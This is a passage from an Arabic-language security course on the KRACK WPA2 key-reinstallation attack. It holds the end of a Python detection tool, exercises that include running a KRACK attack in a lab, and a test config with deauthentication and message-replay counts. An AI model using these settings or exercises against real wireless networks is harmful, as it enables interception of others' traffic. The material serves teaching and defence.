            print(f"[*] Email alerts enabled: {self.alert_email}")
        print(f"[*] Press Ctrl+C to stop\n")
        
        # بدء لوحة المعلومات في thread منفصل
        dashboard_thread = threading.Thread(target=self.print_dashboard)
        dashboard_thread.daemon = True
        dashboard_thread.start()
        
        try:
            # بدء الاستماع
            sniff(
                iface=self.interface,
                prn=self.packet_handler,
                store=0,
                stop_filter=lambda x: not self.running
            )
        
        except KeyboardInterrupt:
            print("\n\n[*] Stopping KRACK IDS...")
            self.running = False
            
            # تصدير التقرير
            self.export_report()
            
            # ملخص نهائي
            print("\n" + "═" * 70)
            print("  FINAL SUMMARY")
            print("═" * 70)
            print(f"  Total Packets: {self.stats['packets_processed']}")
            print(f"  KRACK Attempts Detected: {self.stats['krack_attempts']}")
            print(f"  Total Alerts: {self.stats['alerts_generated']}")
            
            if self.stats['krack_attempts'] > 0:
                print("\n  ⚠️  KRACK attacks were detected during this session!")
                print("     Please review the generated report and evidence files.")
            else:
                print("\n  ✓ No KRACK attacks detected.")
            
            print("═" * 70)

def main():
    """الدالة الرئيسية"""
    
    import argparse
    
    parser = argparse.ArgumentParser(
        description='KRACK Intrusion Detection System',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic monitoring
  sudo python3 krack_ids.py wlan0mon
  
  # With email alerts
  sudo python3 krack_ids.py wlan0mon --email admin@example.com
  
  # Custom alert threshold
  sudo python3 krack_ids.py wlan0mon --threshold 30
"""
    )
    
    parser.add_argument('interface', help='Monitor mode interface (e.g., wlan0mon)')
    parser.add_argument('--email', '-e', help='Email address for critical alerts')
    parser.add_argument('--threshold', '-t', type=int, default=50,
                       help='Alert threshold (default: 50)')
    
    args = parser.parse_args()
    
    # التحقق من صلاحيات root
    if os.geteuid() != 0:
        print("[-] This script requires root privileges!")
        sys.exit(1)
    
    # إنشاء نظام الكشف
    ids = KRACKDetectionSystem(
        interface=args.interface,
        alert_email=args.email
    )
    
    ids.alert_threshold = args.threshold
    
    # بدء المراقبة
    ids.start()

if __name__ == "__main__":
    main()
```

**استخدام نظام الكشف:**

```bash
# مراقبة أساسية
sudo python3 krack_ids.py wlan0mon

# مع تنبيهات البريد الإلكتروني
sudo python3 krack_ids.py wlan0mon --email admin@example.com

# مع عتبة مخصصة
sudo python3 krack_ids.py wlan0mon --threshold 30
```

---

## 📝 تمارين إضافية للطلاب

### التمرين التطبيقي 1: تحليل مقارن
**المطلوب:**
1. التقاط مصافحات من 5 أجهزة مختلفة (Android, iOS, Windows, Linux, IoT)
2. تحليل الاختلافات في سلوك كل نظام
3. توثيق أي سلوكيات غير عادية
4. كتابة تقرير مقارن

### التمرين التطبيقي 2: سيناريو الاختراق الكامل
**المطلوب:**
1. إعداد شبكة اختبار كاملة
2. تنفيذ هجوم KRACK ناجح
3. التقاط بيانات حقيقية (في بيئة محكومة)
4. تحليل البيانات المفككة
5. توثيق كل خطوة بلقطات الشاشة

### التمرين التطبيقي 3: تطوير أداة حماية
**المطلوب:**
1. تطوير أداة للكشف عن KRACK
2. تطبيق تقنيات Machine Learning للكشف
3. اختبار الأداة على بيانات حقيقية
4. قياس معدل الإيجابيات الزائفة

### التمرين التطبيقي 4: تحليل جنائي رقمي
**المطلوب:**
1. تحليل ملف PCAP من هجوم KRACK حقيقي
2. استخراج الأدلة الجنائية
3. بناء timeline للهجوم
4. كتابة تقرير جنائي احترافي

---

## 🔧 ملفات التكوين المفيدة

### ملف تكوين لـ Automated Testing

```bash
# config/krack_test_config.sh

# إعدادات الشبكة
TEST_SSID="KRACK-Lab"
TEST_PASSWORD="SecurePassword123"
TEST_CHANNEL=6

# إعدادات الأجهزة
AP_INTERFACE="wlan0"
CLIENT_INTERFACE="wlan1"
MONITOR_INTERFACE="wlan2mon"

# إعدادات الهجوم
DEAUTH_COUNT=10
MSG3_REPLAY_COUNT=5
CAPTURE_TIMEOUT=60

# إعدادات التقارير
RESULTS_DIR="./krack_results"
LOG_FILE="$RESULTS_DIR/krack_test.log"
PCAP_FILE="$RESULTS_DIR/capture.pcap"

# البريد الإلكتروني للتنبيهات
ALERT_EMAIL="admin@example.com"

# وظائف مساعدة
log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

setup_directories() {
    mkdir -p "$RESULTS_DIR"
    log "Created results directory: $RESULTS_DIR"
}

cleanup() {
    log "Cleaning up..."
    airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null
    systemctl start NetworkManager
    log "Cleanup complete"
}
```

---

## 📚 المراجع والموارد الإضافية

### مراجع أكاديمية:
1. Vanhoef, M., & Piessens, F. (2017). "Key Reinstallation Attacks: Forcing Nonce Reuse in WPA2"
2. IEEE 802.11i-2004 Standard
3. RFC 4306 - Internet Key Exchange (IKEv2) Protocol

### أدوات مفيدة:
```
• Wireshark: https://www.wireshark.org/
• Scapy Documentation: https://scapy.readthedocs.io/
• Aircrack-ng Suite: https://www.aircrack-ng.org/
• KRACK Attack Scripts: https://github.com/vanhoefm/krackattacks-scripts
```

### مواقع تعليمية:
- OWASP Wireless Security Testing Guide
- SANS Institute - Wireless Security
- Offensive Security - WiFu Course

---

## 🎓 خاتمة التمارين العملية

تم تصميم هذه التمارين لتوفير فهم عملي شامل لهجوم KRACK من الناحيتين الهجومية والدفاعية. تذكر دائماً:

### ⚖️ الاعتبارات الأخلاقية والقانونية:

```
┌──────────────────────────────────────────────────────────┐
│  ⚠️  تحذير نهائي وهام جداً                              │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  • استخدم هذه الأدوات فقط على شبكاتك الخاصة            │
│  • احصل على إذن كتابي قبل اختبار أي شبكة               │
│  • هجمات KRACK على شبكات الغير جريمة قانونية           │
│  • المعرفة للدفاع وليس للهجوم                          │
│  • احترم خصوصية الآخرين دائماً                          │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

**بالتوفيق في دراستك! 🎯**
